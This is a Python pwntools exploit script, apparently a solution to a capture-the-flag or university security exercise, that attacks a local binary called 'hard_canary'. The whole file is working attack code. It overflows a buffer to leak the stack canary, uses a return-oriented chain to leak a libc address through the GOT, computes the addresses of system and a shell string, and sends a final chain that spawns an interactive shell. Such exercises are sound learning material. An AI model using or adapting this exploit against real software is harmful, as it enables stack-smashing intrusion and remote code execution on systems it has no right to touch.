import socket
import struct
import telnetlib
from pwn import *

#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('tpas.alunos.dcc.fc.up.pt', 5007))
#s.connect(('127.0.0.1', 2222))

#s = remote("tpas.alunos.dcc.fc.up.pt", 5008)
s = process("./hard_canary")

s.recvuntil("> ")

s.send('1\n')

s.recvuntil("Name: ")

sploit = 'A'*41
s.send(sploit)

s.recvuntil("> ")

s.send('2\n')

canary = s.recvuntil("> ")[54:62].replace('A', '\x00')
print canary
canary = struct.unpack("<Q", canary)[0]
print "[+] Got canary " + hex(canary)

s.send('1\n')

s.recvuntil("Name: ")

sploit1 = sploit[1:]
sploit1 += struct.pack("<Q", canary)
sploit1 += struct.pack("<Q", 0x00000000) # junk
sploit1 += struct.pack("<Q", 0x00400943) # pop rdi; ret
sploit1 += struct.pack("<Q", 0x00601030) # read@got
sploit1 += struct.pack("<Q", 0x00400620) # printf
sploit1 += struct.pack("<Q", 0x004007ce) # menu
s.send(sploit1)

s.recvuntil("> ")

s.send('3\n')

read_got = s.recvuntil("> ")[:8].replace('\x23', '\x00')
read_got = read_got.replace('\x0a', '\x00')
read_got = struct.unpack("<Q", read_got)[0]
print "[+] Got read_got at " + hex(read_got)

libc_start_main = read_got - 0xd6ae0

print "[+] Got libc_start_main at " + hex(libc_start_main)

system = libc_start_main + 0x24c50

print "[+] Got system at " + hex(system)

shell = libc_start_main + 0x16c5d7

pop_rsi = libc_start_main-0x458
pop_rdx = libc_start_main+0xf4926

s.send('1\n')

s.recvuntil("Name: ")

sploit = sploit[1:]
sploit += struct.pack("<Q", canary)
sploit += struct.pack("<Q", 0x00000000) # junk
sploit += struct.pack("<Q", 0x00400943) # pop rdi; ret
sploit += struct.pack("<Q", shell)
sploit += struct.pack("<Q", system)

s.send(sploit)

print s.recvuntil("> ")

#raw_input()

s.send('3\n')

s.interactive()
